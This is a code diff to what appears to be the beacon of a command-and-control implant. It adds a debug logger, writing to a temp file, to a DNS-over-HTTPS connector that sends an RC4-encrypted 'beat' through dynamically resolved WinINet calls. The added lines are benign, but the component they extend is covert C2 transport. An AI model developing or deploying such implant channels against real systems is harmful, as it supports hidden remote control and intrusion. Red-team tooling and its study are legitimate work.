@@ -167,6 +167,32 @@ static int Base64Decode(const CHAR* src, int srcLen, BYTE* dst, int dstMax)
 // ConnectorDoH Implementation
 // -----------------------------------------------------------------------------
 
+// Internal debug logger for DoH connector. Writes short markers into
+// C:\\Windows\\Temp\\ax_doh_beacon.log using Kernel32 APIs from ApiWin.
+static void DohConnectorLog(const char* msg)
+{
+    if (!ApiWin || !ApiWin->CreateFileA || !ApiWin->WriteFile)
+        return;
+
+    CHAR path[] = "C:\\Windows\\Temp\\ax_doh_beacon.log";
+    HANDLE hFile = ApiWin->CreateFileA(path,
+        FILE_APPEND_DATA,
+        FILE_SHARE_READ,
+        NULL,
+        OPEN_ALWAYS,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL);
+    if (hFile == INVALID_HANDLE_VALUE)
+        return;
+
+    DWORD written = 0;
+    SIZE_T len = StrLenA((CHAR*)msg);
+    if (len)
+        ApiWin->WriteFile(hFile, msg, (DWORD)len, &written, NULL);
+    CHAR crlf[] = "\r\n";
+    ApiWin->WriteFile(hFile, crlf, 2, &written, NULL);
+}
+
 ConnectorDoH::ConnectorDoH()
 {
     this->functions = (DOH_HTTP_FUNC*) ApiWin->LocalAlloc(LPTR, sizeof(DOH_HTTP_FUNC) );
@@ -206,6 +232,7 @@ BOOL ConnectorDoH::SetConfig(ProfileDoH profile, BYTE* beat, ULONG beatSize)
 {
     // Verify WinINet APIs are loaded
     if (!this->functions || !this->functions->InternetOpenA || !this->functions->HttpSendRequestA) {
+        DohConnectorLog("[DoH] SetConfig: WinINet functions missing");
         return FALSE;
     }
 
@@ -256,17 +283,23 @@ BOOL ConnectorDoH::SetConfig(ProfileDoH profile, BYTE* beat, ULONG beatSize)
     
     // Fallback: If no URLs provided, use Google DNS as default
     if (this->urlCount == 0) {
+        DohConnectorLog("[DoH] SetConfig: urlCount=0, fallback to https://dns.google/dns-query");
         CHAR defaultUrl[] = "https://dns.google/dns-query";
         lstrcpynA(this->rawUrls, defaultUrl, sizeof(this->rawUrls));
         this->urlList[0] = this->rawUrls;
         this->urlCount = 1;
     }
     
-    if (!beat || !beatSize || beatSize < 8)
+    if (!beat || !beatSize || beatSize < 8) {
+        DohConnectorLog("[DoH] SetConfig: invalid beat (null or too small)");
         return FALSE;
+    }
 
     BYTE* beatCopy = (BYTE*)MemAllocLocal(beatSize);
-    if (!beatCopy) return FALSE;
+    if (!beatCopy) {
+        DohConnectorLog("[DoH] SetConfig: MemAllocLocal for beatCopy failed");
+        return FALSE;
+    }
     memcpy(beatCopy, beat, beatSize);
 
     EncryptRC4(beatCopy, beatSize, this->encryptKey, 16);
@@ -293,6 +326,7 @@ BOOL ConnectorDoH::SetConfig(ProfileDoH profile, BYTE* beat, ULONG beatSize)
     }
 
     this->initialized = TRUE;
+    DohConnectorLog("[DoH] SetConfig: OK (initialized)");
     return TRUE;
 }
 
